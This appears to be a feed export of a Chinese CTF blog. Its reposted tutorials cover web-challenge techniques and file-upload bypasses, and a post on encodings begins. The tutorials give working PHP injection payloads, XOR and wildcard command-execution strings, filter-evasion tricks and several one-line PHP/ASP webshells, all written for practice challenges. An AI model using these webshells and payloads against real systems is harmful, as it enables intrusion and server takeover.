    <id>http://yoursite.com/2020/04/30/CTF%E4%B8%ADWeb%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E5%8F%8A%E8%A7%A3%E9%A2%98%E5%A7%BF%E5%8A%BF/</id>
    <published>2020-04-30T15:55:54.000Z</published>
    <updated>2020-05-26T10:41:44.408Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="基础知识类题目"><a href="#基础知识类题目" class="headerlink" title="基础知识类题目"></a>基础知识类题目</h2><p>考察基本的查看网页源代码、HTTP请求、修改页面元素等。</p><p>这些题很简单，比较难的比赛应该不会单独出，就算有因该也是Web的签到题。</p><p>实际做题的时候基本都是和其他更复杂的知识结合起来出现。</p><p>姿势：恶补基础知识就行</p><h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码"></a>查看网页源代码</h2><p>按F12就都看到了，flag一般都在注释里，有时候注释里也会有一条hint或者是对解题有用的信息。</p><p>BugKu web2:<a href="http://123.222.333.12:8002/web2">http://123.222.333.12:8002/web2</a><br>BugKu web3:<a href="http://123.222.333.12:8002/web3">http://123.222.333.12:8002/web3</a></p><h2 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h2><p>可以用hackbar，有的也可以写脚本。</p><p>BugKu web2基础$_GET:<a href="http://123.222.333.12:8002/get/">http://123.222.333.12:8002/get/</a><br>BugKu web2基础$_POST:<a href="http://123.222.333.12:8002/post/">http://123.222.333.12:8002/post/</a><br>BugKu 点击一百万次:<a href="http://123.222.333.12:8002/test/">http://123.222.333.12:8002/test/</a></p><p>举个脚本的例子（题目是Bugku web基础$_POST):</p><pre><code>import requestsr = requests.post(&#39;http://123.222.333.12:8002/post/&#39;,data=[&#39;what&#39; : &#39;flag&#39;])print(r.text)</code></pre><h2 id="不常见类型的请求发送"><a href="#不常见类型的请求发送" class="headerlink" title="不常见类型的请求发送"></a>不常见类型的请求发送</h2><p>以前做过一道题考OPIONS请求，可惜题目找不到了，而且那道题也不算很基础。</p><p>不过如果要发送这类请求，写一个脚本应该就能解决了。</p><h2 id="HTTP头相关的题目"><a href="#HTTP头相关的题目" class="headerlink" title="HTTP头相关的题目"></a>HTTP头相关的题目</h2><p>主要是查看和修改HTTP头。</p><p>目前做过的web题目有很大一部分都是与HTTP头相关的，而且这种题目也相当常见，</p><p>不和其他知识结合的情况下也算事属于基础题的范畴吧。</p><p>姿势：不同的类型有不同的利用方法，基本都离不开抓包，有些简单的也可以利用浏览器F12的网络标签解决。但是最根本的应对策略，是</p><p>熟悉一些常见请求头的格式、作用等，这样考题目的时候就很容易知道要怎么做了。</p><h2 id="查看相应头"><a href="#查看相应头" class="headerlink" title="查看相应头"></a>查看相应头</h2><p>有时候响应头里会有hint或者题目关键信息，也有时候会直接把flag放在响应头里给，但是直接查看响应头拿flag的题目不多，</p><p>因为太简单了。</p><p>知识查看的话，可以不用抓包，用F12的“网络”标签就可以解决了。</p><p>BugKu 头等舱:<a href="http://123.222.333.12:8002/hd.php">http://123.222.333.12:8002/hd.php</a></p><h2 id="修改请求头、伪造Cookie"><a href="#修改请求头、伪造Cookie" class="headerlink" title="修改请求头、伪造Cookie"></a>修改请求头、伪造Cookie</h2><p>常见的有set-cookie、XFF和Referer,总之考法很灵活，做法比较固定，知道一些常见的请求头再根据题目随机应变就没问题了。</p><p>有些题目还需要伪造cookie，根据题目要求做就行了。</p><p>可以用Burp抓包，也可以直接在浏览器的F12“网络”标签里改。</p><h2 id="Git源码泄露"><a href="#Git源码泄露" class="headerlink" title="Git源码泄露"></a>Git源码泄露</h2><p>flag一般在源码的某个文件里，但也有和其他知识结合、需要进一步利用的情况，比如XCTF社区的mfw这道题。</p><p>姿势：GitHack一把梭</p><h2 id="python爬虫信息处理"><a href="#python爬虫信息处理" class="headerlink" title="python爬虫信息处理"></a>python爬虫信息处理</h2><p>这类题目一般都是给一个页面，页面中有算式或者是一些数字，要求在很短的时间内求出结果并提交，如果结果正确就可以返回flag。</p><p>因为所给时间一般都很短而且计算比较复杂，所以只能写脚本。这种题目的脚本一般都需要用到requests库BeauifulSoup库（或者re库（正则表达式）），个人感觉使用BeautifulSoup简单一些。</p><p>姿势：requests库和BeautifulSoup库熟练掌握后，再多做几道题或者写几个爬虫的项目，一般这类题目就没什么问题了。主要还是对BeautifulSoup的熟练掌握，另外还需要一点点web前端（html）的知识</p><p>Bugku 秋名山老司机： <a href="http://123.206.87.240:8002/qiumingshan/#这道题的脚本如下，还可以继续优化" target="_blank" rel="noopener">http://123.206.87.240:8002/qiumingshan/#这道题的脚本如下，还可以继续优化</a><br>#经常出现执行了但是不弹flag的情况，多试几次就行了</p><pre><code>from bs4 import BeautifulSoupimport requestsr = requests.Session()s = r.get(&quot;http://123.206.87.240:8002/qiumingshan/&quot;)s.encoding = &#39;utf-8&#39;text = s.textsoup = BeautifulSoup(text)tag = soup.divexpress = str(tag.string)express = express[0 : -3]answer = eval(express)ans = {&quot;value&quot; : answer}flag = r.post(&#39;http://123.206.87.240:8002/qiumingshan/&#39;, data = ans)print(flag.text)实验吧 速度爆破： http://www.shiyanbar.com/ctf/1841</code></pre><p>HGAME2019的部分题目似乎还出现了反爬虫措施，但当时我还不会写爬虫，那一道题目也没有做，所以也不大清楚，以后如果再遇到那类题目再慢慢补上吧。</p><h2 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h2><p>代码审计覆盖面特别广，分类也很多，而且几乎什么样的比赛都会有，算是比较重要的题目类型之一吧。</p><p>姿势：具体问题具体分析，归根结底还是要熟练掌握PHP这门语言，了解一些常见的会造成漏洞的函数及利用方法等。</p><h2 id="PHP弱类型hash比较缺陷"><a href="#PHP弱类型hash比较缺陷" class="headerlink" title="PHP弱类型hash比较缺陷"></a>PHP弱类型hash比较缺陷</h2><p>这是代码审计最基础的题目了，也比较常见。</p><p>典型代码：</p><pre><code>if(md5($a) == md5($b)) {    //注意两个等号“==”    echo $flag;}</code></pre><p>加密函数也有可能是sha1或者其他的，但是原理都是不变的。<br>这个漏洞的原理如下：</p><pre><code>== 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较。0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。</code></pre><p>所以只要让a和b在经过相应的函数加密之后都是以0e开头就可以。<br>以下是一些md5加密后开头为0e的字符串：</p><pre><code>QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514aabg7XSs</code></pre><p>另外，这个也可以用数组绕过，这个方法在下面会详细说。</p><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><p>PHP绝大多数函数无法处理数组，向md5函数传入数组类型的参数会使md5()函数返回NULL（转换后为False），进而绕过某些限制。<br>如果上面的代码变成：</p><pre><code>if(md5($a) === md5($b)) {       //两个等号变成三个    echo $flag;}</code></pre><p>那么利用弱类型hash比较缺陷将无法绕过，这时可以使用数组绕过。<br><strong>传入?a[]=1&amp;b[]=2</strong> 就可以成功绕过判断。<br>这样的方法也可以用来绕过sha1()等hash加密函数相关的判断，也可以绕过正则判断，可以根据具体情况来灵活运用。</p><h2 id="正则表达式相关"><a href="#正则表达式相关" class="headerlink" title="正则表达式相关"></a>正则表达式相关</h2><p><strong>ereg正则%00截断</strong></p><p>ereg函数存在NULL截断漏洞，使用NULL可以截断过滤，所以可以使用%00截断正则匹配。</p><p>Bugku ereg正则%00截断：<a href="http://123.206.87.240:9009/5.php" target="_blank" rel="noopener">http://123.206.87.240:9009/5.php</a></p><p> 数组绕过</p><p>正则表达式相关的函数也可以使用数组绕过过滤，绕过方法详见数组返回NULL绕过。</p><p>上面那道题也可以用数组绕过。</p><p> 单引号绕过preg_match()正则匹配</p><p>在每一个字符前加上单引号可以绕过preg_match的匹配，原理暂时不明。<br>例如有如下代码：</p><pre><code>&lt;?php    $p = $_GET[&#39;p&#39;];    if (preg_match(&#39;/[0-9a-zA-Z]{2}/&#39;,$p) === 1) {        echo &#39;False&#39;;    } else {        $pp = trim(base64_decode($p));        if ($pp === &#39;flag.php&#39;) {            echo &#39;success&#39;;        }    }?&gt;</code></pre><p>payload：p=’Z’m’x’h’Z’y’5’w’a’H’A’=</p><p> 不含数字与字母的WebShell</p><p>如果题目使用preg_match()过滤掉了所有的数字和字母，但是没有过滤PHP的变量符号$，可以考虑使用这种方法。</p><p>典型代码：</p><pre><code>&lt;?php include&#39;flag.php&#39;; if(isset($_GET[&#39;code&#39;])){    $code=$_GET[&#39;code&#39;];    if(strlen($code)&gt;50){        die(&quot;Too Long.&quot;);   }    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){        die(&quot;Not Allowed.&quot;);   }    @eval($code); }else{    highlight_file(__FILE__); } //$hint = &quot;php function getFlag() to get flag&quot;; ?&gt;</code></pre><p>这种方法的核心是字符串的异或操作。</p><p>爆破脚本：</p><pre><code>chr1 = [&#39;@&#39;, &#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &#39;\&#39;&#39;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;_&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;]chr2 = [&#39;@&#39;, &#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &#39;\&#39;&#39;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;_&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;]for i in chr1 :    for j in chr2 :        print(i + &#39;xor&#39; + j + &#39;=&#39; + (chr(ord(i) ^ ord(j))))</code></pre><p>根据题目的要求，用异或出来的字符串拼出合适的Payload，并放在PHP变量中执行。变量名可以用中文。<br>比如这道题的Payload：?code=$啊=”@@^|@@@”^”‘%*:,!’”;$啊();</p><p>Linux通配符绕过正则匹配</p><p>典型代码如下，与前一种题目非常相似，但也不大一样：</p><pre><code>&lt;?php if(isset($_GET[&#39;code&#39;])){    $code=$_GET[&#39;code&#39;];    if(strlen($code)&gt;50){        die(&quot;Too Long.&quot;);   }    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code)){        die(&quot;Not Allowed.&quot;);   }    @eval($code); }else{    highlight_file(__FILE__); } //flag in / ?&gt; </code></pre><p>最主要的区别就是过滤了$和_，也就是说无法使用变量符号$了。<br>这时候可以考虑采用通配符绕过。<br>通配符有点像正则表达式，有自己的匹配规则，看这张图：</p><p><img src="http://cdn.sijiu.ren/blog/20200501/J28x2Wmxqnal.bmp" alt></p><p>所以构造一下通配符就是/???/??? /<em>。<br>因为过滤了变量符号，没法通过上面那种方法来执行了。但是，可以通过闭合PHP标记来执行，也就是：?&gt;&lt;?=/???/??? /</em>?&gt;（/bin/cat /<em>）。<br>所以本题的payload为：?code=?&gt;&lt;?=/???/??? /</em>?&gt;<br>具体解法可以参照此篇文章的前两道题目：<a href="https://www.jianshu.com/p/ecc2414ec110" target="_blank" rel="noopener">https://www.jianshu.com/p/ecc2414ec110</a></p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p> assert()函数引起的命令执行</p><p>ssert函数的参数为字符串时，会将字符串当做PHP命令来执行。<br>例如：assert(‘phpinfo()’)相当于执行<?php phpinfo() ?><br>以一道题目为例：<br>本题目中题目文件夹下放置了一个隐藏的flag文件。</p><pre><code>&lt;?phperror_reporting(0);if (isset($_GET[&#39;file&#39;])) {    if($_GET[&#39;file&#39;] === &quot;flag&quot;){        highlight_file(&quot;flag.php&quot;);    }else{        $page = $_GET[&#39;file&#39;];    }} else {    $page = &quot;./flag.php&quot;;}assert(&quot;file_exists(&#39;$page&#39;)&quot;);?&gt; </code></pre><p>解法：<br>构造闭合 file_exists()函数，并使assert()执行恶意代码。<br>Linux命令ls -a可用于查看该目录下所有文件，包括隐藏文件。</p><p>payload：</p><pre><code>?file=123&#39;) or system(&#39;ls -a&#39;);#?file=123&#39;) or system(&#39;cat .ffll44gg&#39;);#</code></pre><h2 id="XSS题目"><a href="#XSS题目" class="headerlink" title="XSS题目"></a>XSS题目</h2><p>这类题目会涉及到三种XSS类型，具体类型要根据题目来判断。一般都是向后台发送一个带有XSS Payload的文本，在返回的Cookie中含有flag，解法是在XSS Payload。<br>这类题目一般都会带有过滤和各种限制，需要了解一些常用的绕过方法。<br>姿势：XSS归根结底还是JavaScript，JavaScript的威力有多大，XSS的威力就有多大。要知道一些常用的XSS Payload，还要把三类XSS的原理弄明白。做题时需要用到XSS平台，网上有公用的，也可以自己在VPS上搭一个。</p><p>JavisOJ babyxss：<a href="http://web.jarvisoj.com:32800/" target="_blank" rel="noopener">http://web.jarvisoj.com:32800/</a></p><h2 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h2><p>其实绝大多数比较难的题目多多少都会对输入有过滤，毕竟在现实的网络中肯定是会对输入进行限制的，但是这里还是把过滤单独列出来了。<br>姿势：多掌握一些不同的绕过方法。</p><h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><p>有些题目会要求输入较长的文本，但对文本的长度进行了限制。<br>对于这种题目，既可以用BurpSuite抓包改包绕过，也可以直接在F12里改页面源代码。</p><p>Bugku 计算器（修改页面源代码）：<a href="http://123.206.87.240:8002/yanzhengma/" target="_blank" rel="noopener">http://123.206.87.240:8002/yanzhengma/</a><br>DVWA 存储型XSS的标题栏会对长度进行限制，使用BurpSuite抓包绕过。</p><h2 id="双写"><a href="#双写" class="headerlink" title="双写"></a>双写</h2><pre><code>双写可以绕过对输入内容过滤的单次判断，在XSS、SQL注入和PHP代码审计的题目中比较常见。双写顾名思义就是将被过滤的关键字符写两遍，比如，如果要添加XSS  Payload，又需要插入&lt;script&gt;标签，就可以构造如下的Payload：&lt;scr&lt;script&gt;ipt&gt;来绕过对&lt;script&gt;标签的单次过滤限制。这样的方法不仅对XSS有用，也可以用于代码审计和SQL注入。HGAME2019有一道XSS题目就是过滤了&lt;script&gt;，可以用双写绕过。</code></pre><h2 id="等价替代"><a href="#等价替代" class="headerlink" title="等价替代"></a>等价替代</h2><pre><code>就是不用被过滤的字符，而使用没有被过滤却会产生相同效果的字符。比如，如果SQL注入题目中过滤了空格，可以用/**/绕过对空格的限制；XSS题目如果过滤了&lt;script&gt;标签，可以使用其他类型的payload；如果需要使用cat命令却被过滤，可以使用tac、more、less命令来替代等。实验吧 简单的SQL注入：http://www.shiyanbar.com/ctf/1875</code></pre><h2 id="URL编码绕过"><a href="#URL编码绕过" class="headerlink" title="URL编码绕过"></a>URL编码绕过</h2><p>如果过滤了某个必须要用的字符串，输入的内容是以GET方式获取的（也就是直接在地址栏中输入），可以采用url编码绕过的方式。比如，过滤了 cat，可以使用 c%61t来绕过。</p><h2 id="Linux命令使用反斜杠绕过"><a href="#Linux命令使用反斜杠绕过" class="headerlink" title="Linux命令使用反斜杠绕过"></a>Linux命令使用反斜杠绕过</h2><p>在Linux下，命令中加入反斜杠与原命令完全等价。例如，cat与 ca\t两条命令等价，效果完全相同。<br>可以利用这个特性来进行一些绕过操作（当然，这个仅限于命令执行漏洞）。</p><h2 id="URL二次解码绕过"><a href="#URL二次解码绕过" class="headerlink" title="URL二次解码绕过"></a>URL二次解码绕过</h2><p>这个类型本来应该放在代码审计里面，但是既然是一种绕过过滤的姿势，就写在这里了。<br>如果源码中出现了urldecode()函数，可以利用url二次解码来绕过。<br>以下是一些常用的HTML URL编码：<br><img src="http://cdn.sijiu.ren/blog/20200501/47qjmfx9KN8u.bmp" alt></p><p>Bugku urldecode二次编码绕过：<a href="http://123.206.87.240:9009/10.php" target="_blank" rel="noopener">http://123.206.87.240:9009/10.php</a></p><h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>详见PHP代码审计的“数组返回NULL”绕过。<br>数组绕过的应用很广，很多题目都可以用数组绕过。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入是一种灵活而复杂的攻击方式，归根结底还是考察对SQL语言的了解和根据输入不同数据网页的反应对后台语句的判断，当然也有sqlmap这样的自动化工具可以使用。<br>姿势：如果不用sqlmap或者是用不了，就一定要把SQL语言弄明白，sqlmap这样的自动化工具也可以使用。</p><h2 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a>使用sqlmap</h2><p>sqlmap的应用范围还不大明确，我都是如果sqlmap没法注入就手工注入。</p><p>sqlmap教程：<a href="https://www.jianshu.com/p/4509bdf5e3d0" target="_blank" rel="noopener">https://www.jianshu.com/p/4509bdf5e3d0</a></p><p>转载：<a href="https://www.cnblogs.com/daiorz/p/12294963.html" target="_blank" rel="noopener">https://www.cnblogs.com/daiorz/p/12294963.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;基础知识类题目&quot;&gt;&lt;a href=&quot;#基础知识类题目&quot; class=&quot;headerlink&quot; title=&quot;基础知识类题目&quot;&gt;&lt;/a&gt;基础知识类题目&lt;/h2&gt;&lt;p&gt;考察基本的查看网页源代码、HTTP请求、修改页面元素等。&lt;/p&gt;
&lt;p&gt;这
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF文件上传绕过姿势</title>
    <link href="http://yoursite.com/2020/04/29/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
    <id>http://yoursite.com/2020/04/29/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</id>
    <published>2020-04-29T13:58:56.000Z</published>
    <updated>2020-05-26T10:41:25.425Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h2><h3 id="绕过js过滤"><a href="#绕过js过滤" class="headerlink" title="绕过js过滤"></a>绕过js过滤</h3><h4 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h4><p>1.在控制台重新定义函数 <code>function checkFile(){}</code> 回车即可(<strong>注：需要在未触发该函数前</strong>)</p><p>2.将一句话木马文件后缀改为<code>.png .jpg .gif</code>后，点击上传。用<code>BurpSuite</code>截断，然后将文件名再替换成<code>.php</code></p><h2 id="后端过滤"><a href="#后端过滤" class="headerlink" title="后端过滤"></a>后端过滤</h2><h3 id="利用解析漏洞绕过"><a href="#利用解析漏洞绕过" class="headerlink" title="利用解析漏洞绕过"></a>利用解析漏洞绕过</h3><h4 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h4><p>IIS 6.0在解析文件时存在以下两个解析漏洞。<br> 当建立<em>.asa、</em>.asp格式的文件夹时，其目录下的任意文件都将被IIS当做asp文件来解析。<br> 例如：建立文件夹parsing.asp，在parsing.asp文件夹内新建一个文本文档test.txt，其内容为&lt;%=NOW()%&gt;，然后在浏览器内访问。<br> “NOWO”是ASP提供获取当前时间的函数，TXT是文本文档格式，IIS是不会去解析此类文件的，应该会直接显示其内容，而在parsing.asp文件夹中，却被当作ASP脚本来解析。<br> 当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行，如：新建文件test.asp;1.jpg，内容为&lt;%=NOW()%&gt;。</p><h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断，如xxx.php.owf.rar ，”.owf”和”.rar”这两种后缀是apache解析不了的，apache就会把xxx.php.owf.rar解析成php。<br> 怎么去判断是不是合法的后缀就是这个漏洞利用关键，测试时把常见的后缀都写上，去测试是不是合法，任意不识别的后缀，逐级向上识别。<br> 有些程序开发人员在上传文件时，判断文件名是否是PHP、ASP、ASPX、ASA、CER、ASPX等脚本扩展名，如果是，则不允许上传，这时攻击者就有可能上传1.php.rar等扩展名来绕过程序检测，并配合解析漏洞，获取到WebShell。</p><h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p>解析： (任意文件名)/(任意文件名).php | (任意文件名)%00.php<br> 描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。<br> 还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p><h3 id="猜测过滤规则绕过"><a href="#猜测过滤规则绕过" class="headerlink" title="猜测过滤规则绕过"></a>猜测过滤规则绕过</h3><h4 id="文件后缀名黑名单："><a href="#文件后缀名黑名单：" class="headerlink" title="文件后缀名黑名单："></a>文件后缀名黑名单：</h4><p>​                        大小写绕过 <code>Php、PhP···</code><br>​                        利用能被解析的后缀名，例如<code>php、php3、php4、php5、php7、pht、phtml、phps</code></p><h4 id="MIME类型绕过"><a href="#MIME类型绕过" class="headerlink" title="MIME类型绕过"></a>MIME类型绕过</h4><p>​                        BurpSuite<code>抓包,更改</code>content-type<code>请求头为</code>image/gif、image/png、image/jpg</p><p><img src="http://cdn.sijiu.ren/blog/20200430/Bmm4AQeftwkO.bmp" alt></p><h4 id="图片马内容检测"><a href="#图片马内容检测" class="headerlink" title="图片马内容检测"></a>图片马内容检测</h4><p>​                  更换一句话木马形式<code>&lt;% eval request(&quot;123&quot;)%&gt;</code>等等</p><h4 id="文件内容头检测"><a href="#文件内容头检测" class="headerlink" title="文件内容头检测"></a>文件内容头检测</h4><p>上述方法均失效时可以考虑一下网站是否检测了文件头<br> 解决方法1：添加图片文件头到木马文件<br> <code>GIF89a? &lt;% eval request(&quot;123&quot;)%&gt;</code><br> 文件头对照参考：<a href="https://blog.csdn.net/rrrfff/article/details/7484109" target="_blank" rel="noopener">https://blog.csdn.net/rrrfff/article/details/7484109</a><br> 解决方法2：将一张图片与一句话木马文件结合<br> 1.记事本打开图片，在末尾或者之中添加一句话木马 2.使用命令将图片与木马文件结合,链接：<a href="https://jingyan.baidu.com/article/a65957f42c7c1224e67f9bb1.html(注：麻烦，且命令好像不对)" target="_blank" rel="noopener">https://jingyan.baidu.com/article/a65957f42c7c1224e67f9bb1.html(注：麻烦，且命令好像不对)</a></p><h3 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h3><h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p> 文件上传后，网站系统会对文件进行恶意代码检测，若是存在恶意代码，则会删除该文件 </p><p> 若在这个操作的时间之内，访问该上传的文件，利用之间的时间差来获取shell</p><p>user.ini<code>利用 (**注：上传目录下要有可执行的</code>php<code>文件，一般是自带的，而不是自己上传的，要是可以的话，还需要这么多骚操作干什么**)</code></p><p>大佬的教程链接：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html`" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html`</a><br> 利用方式的复现地址：`<a href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn" target="_blank" rel="noopener">https://buuoj.cn/challenges#[SUCTF%202019]CheckIn</a></p><h5 id="Apache的-htaccess"><a href="#Apache的-htaccess" class="headerlink" title="Apache的.htaccess"></a>Apache<code>的</code>.htaccess</h5><p>大佬的教程链接：<a href="https://www.cnblogs.com/hmbb/p/9689436.html" target="_blank" rel="noopener">https://www.cnblogs.com/hmbb/p/9689436.html</a></p><h3 id="常用一句话木马-php"><a href="#常用一句话木马-php" class="headerlink" title="常用一句话木马(php)"></a>常用一句话木马(php)</h3><pre><code class="php">    GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt; 比较好用    &lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;    &lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[‘h‘],&quot;error&quot;); ?&gt; //使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入&quot;h=@eval($_POST[c]);&quot;    &lt;?php $c=‘ass‘.‘ert‘;${c}($_POST[4]);?&gt;</code></pre><h3 id="Attention："><a href="#Attention：" class="headerlink" title="Attention："></a>Attention：</h3><p> 一般要利用文件上传漏洞需要结合上述多种操作才行，需要灵活变通</p><p>参考：<br><a href="https://www.cnblogs.com/20175211lyz/p/10989689.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/10989689.html</a><br><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p><p>转载：<a href="https://www.cnblogs.com/wjrblogs/p/12296038.html" target="_blank" rel="noopener">https://www.cnblogs.com/wjrblogs/p/12296038.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;前端过滤&quot;&gt;&lt;a href=&quot;#前端过滤&quot; class=&quot;headerlink&quot; title=&quot;前端过滤&quot;&gt;&lt;/a&gt;前端过滤&lt;/h2&gt;&lt;h3 id=&quot;绕过js过滤&quot;&gt;&lt;a href=&quot;#绕过js过滤&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>常见的加密类型</title>
    <link href="http://yoursite.com/2020/04/27/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%B1%BB%E5%9E%8B/"/>
    <id>http://yoursite.com/2020/04/27/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%B1%BB%E5%9E%8B/</id>
    <published>2020-04-26T16:06:30.000Z</published>
    <updated>2020-05-26T10:40:20.994Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正文开始之前先闲扯几句吧，玩CTF的小伙伴也许会遇到类似这样的问题:师傅，你知道这是什么加密吗？其实CTF中脑洞密码题(非现代加密方式)一般都是各种古典密码的变形，一般出题者会对密文进行一些处理，但是会给留一些线索，所以写此文的目的是想给小伙伴做题时给一些参考，当然常在CTF里出现的编码也可以了解一下。</p><h2 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h2><h3 id="1-ASCII编码"><a href="#1-ASCII编码" class="headerlink" title="1.ASCII编码"></a>1.ASCII编码</h3><p>ASCII编码大致可以分作三部分组成：</p><p>第一部分是：ASCII非打印控制字符（参详ASCII码表中0-31）;</p><p>第二部分是：ASCII打印字符，也就是CTF中常用到的转换：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/px0x8vISJRbm.jpg?imageslim" alt></p><p>第三部分是：扩展ASCII打印字符(第一第三部分详见 <a href="http://www.asciima.com/" target="_blank" rel="noopener">ASCII码表</a> 解释)。</p><p>编码转换示例</p><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p><img src="http://cdn.sijiu.ren/blog/20200426/8Ltmr3nw6OnR.png?imageslim" alt="mark"></p><p>ASCII编码对应十进制：</p><pre><code>#!shell84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103</code></pre><p>对应可以转换成二进制，八进制，十六进制等。</p><h3 id="2-Base64-32-16编码"><a href="#2-Base64-32-16编码" class="headerlink" title="2.Base64/32/16编码"></a>2.Base64/32/16编码</h3><p>base64、base32、base16可以分别编码转化8位字节为6位、5位、4位。16,32,64分别表示用多少个字符来编码，这里我注重介绍base64。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via 